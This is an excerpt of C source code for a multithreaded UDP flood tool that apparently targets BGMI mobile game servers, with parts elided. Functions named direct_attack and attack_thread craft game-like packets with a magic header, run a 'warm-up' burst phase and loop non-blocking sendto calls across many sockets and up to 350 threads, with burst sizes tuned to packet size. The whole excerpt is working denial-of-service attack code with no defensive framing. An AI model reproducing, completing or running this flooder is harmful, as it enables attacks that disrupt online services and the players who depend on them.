...
#define WARMUP_BURST_MULTIPLIER 10
#define WARMUP_SLEEP_DIVIDER 10
...
void create_bgmi_packet(char *buf, int size, int thread_id, unsigned int seq, unsigned int *seed, int is_warmup) {
    ...
    if (is_warmup) {
        int warmup_sizes[] = {24, 28, 32, 36, 40, 44, 48, 52, 56};
        int idx = fast_rand(seed) % 9;
        actual_size = warmup_sizes[idx];
    }
    
    if (is_warmup) {
        if (actual_size < 24) actual_size = 24;
        if (actual_size > 56) actual_size = 56;
    } else {
    ...
    if (is_warmup) {
        int pattern_type = fast_rand(seed) % 5;
        ...
        if (pattern_type == 0) {
            ...
            buf[2] = 'L';
            buf[3] = 'D';
            for (int i = 4; i < actual_size; i++) {
                buf[i] = (fast_rand(seed) + i) & 0xFF;
            }
        }
        else {
            memset(buf, 0xCC, actual_size);
            int offset = fast_rand(seed) % 16;
            for (int i = offset; i < actual_size; i += 12) {
                if (i + 12 <= actual_size) {
                    uint32_t *hdr = (uint32_t*)(buf + i);
                    hdr[0] = 0xFFFFFFFF;
                    hdr[1] = 0x00000000;
                    hdr[2] = BGMI_MAGIC_HEADER;
                }
            }
        }
        return;
...
void *direct_attack(void *arg) {
    ...
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0 && packets[i]) {
            create_bgmi_packet(packets[i], 56, thread_idx + 1000, 0, &seed, 1);
            sendto(socks[i], packets[i], 56, MSG_DONTWAIT,
    ...
    int optimal_burst;
    if (PACKET_SIZE <= 40) {
        optimal_burst = 600 + (rand() % 300);
    } else if (PACKET_SIZE <= 60) {
        optimal_burst = 450 + (rand() % 250);
    } else {
        optimal_burst = 300 + (rand() % 200);
    }
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            ...
            int current_size = atomic_load(&warmup_complete) ? PACKET_SIZE : 56;
...
void *attack_thread(void *arg) {
    ...
    int random_delay = (tid * 7919) % 2000;
    ...
    create_bgmi_packet(warmup_packet, 56, tid, 0, &seed, 1);
    sendto(s, warmup_packet, 56, MSG_DONTWAIT,
           (struct sockaddr *)&warmup_addr, sizeof(warmup_addr));
    ...
    if (PACKET_SIZE <= 40) {
        packets_per_burst = 180 + (tid % 140);
        sleep_microseconds = 800;
    } else if (PACKET_SIZE <= 60) {
        packets_per_burst = 130 + (tid % 110);
        sleep_microseconds = 1500;
    } else {
        packets_per_burst = 90 + (tid % 70);
...
void *warmup_controller(void *arg) {
    printf("⚡ Warm-up: %d seconds (1000%% power)...\n", WARMUP_SECONDS);
...
int main(int argc, char *argv[]) {
    ...
    printf("📦 Packet Size: %d bytes (20-128)\n", PACKET_SIZE);
    printf("🧵 Threads: %d (50-350)\n", THREAD_COUNT);
    printf("===============================================\n");
